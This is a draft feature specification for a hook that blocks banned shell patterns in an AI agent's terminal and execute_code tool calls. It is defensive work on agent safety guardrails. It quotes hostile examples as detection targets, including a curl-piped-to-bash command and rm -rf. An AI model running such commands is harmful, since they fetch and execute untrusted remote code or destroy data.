# TEMPLATE: Feature Specification — Intercept execute_code tool payloads

**Branch**: `003-execute-code-interception`
**Created**: 2026-10-18
**Status**: Draft

## User Scenarios *(mandatory)*

### User Story 1 - execute_code payloads with banned patterns are blocked (P1)
An agent invokes the `execute_code` tool with a `code` argument that embeds a banned shell pattern (e.g. `os.system("curl -s https://x | bash")`, a heredoc, or an `rm -rf` inside a subprocess string). second-thoughts blocks the call, returns the per-pattern "On second thought..." redirect, and nothing executes.

**Acceptance Scenarios**:
1. **Given** an `execute_code` call whose `code` contains an embedded banned pattern (pipe-to-interpreter / curl-bash / rm-rf / heredoc) as a shell string, **When** the pre_tool_call hook runs, **Then** it returns `{"action": "block", "message": <that rule's message>}` and no code executes.
2. **Given** an `execute_code` call whose `code` is clean, **When** the hook runs, **Then** it returns `None` (pass-through).
3. **Given** any non-`terminal`, non-`execute_code` tool call, **When** the hook runs, **Then** it returns `None`.

### User Story 2 - Unchanged behaviour for terminal and config stays intact (P1)
Adding execute_code interception must not regress the terminal path or break the existing hot-reload/config semantics.

**Acceptance Scenarios**:
1. **Given** a `terminal` call, **When** the hook runs, **Then** it behaves exactly as sprint-001/002 (block on banned-command match, pass-through otherwise).
2. **Given** a rule added/edited via the shared YAML (defaults or user override), **When** hot-reload applies, **Then** the rule governs BOTH `terminal` and `execute_code` scanning.

## Requirements *(mandatory)*

### Functional Requirements
- **FR-001**: The hook MUST scan `tool_name` in `{"terminal", "execute_code"}` (currently terminal-only).
- **FR-002**: For `terminal`, scan `args.command`; for `execute_code`, scan `args.code` — against the SAME compiled rule set (no per-tool taxonomy this sprint).
- **FR-003**: Non-matching calls and all other tools MUST pass through unchanged (`None`).
- **FR-004**: On a match the hook MUST hard-block with the configured per-pattern message and the call MUST NOT execute.
- **FR-005**: The shared YAML rule set and sprint-002 hot-reload MUST continue to apply to both tool types (rule edits live for both).
- **FR-006**: No separate per-tool rule lists or new config schema in this sprint (YAGNI); the false-positive tradeoff for code-payload scanning is accepted and adjustable only by editing the shared YAML rules (which also affects terminal matching).
- **FR-007**: Terminal behaviour MUST be regression-free (existing suite stays green; the sprint-001 "execute_code passes" semantics test is updated to "clean execute_code passes").
- **FR-008**: Script-file write interception (`write_file` producing `.py`/`.sh`) is EXPLICITLY out of scope (future item).

### Success Criteria *(mandatory)*
- **SC-001**: The automated suite shows an `execute_code` code payload containing an embedded banned pattern returns the block directive with that rule's message; a clean payload returns `None`; another tool returns `None`.
- **SC-002**: A live/product-style check (isolated temp HERMES_HOME) shows a rule added via the user override applies to an `execute_code` payload via hot-reload without a restart, and the full suite stays green.

> **Deploy note**: YAML rule edits hot-reload via mtime (sprint 002). The NEW hook logic (execute_code scanning in `__init__.py`) is Python code and requires a gateway restart to load — the same symlink/restart distinction as any code change.

## Review Result
STATUS: [PASS | FAIL]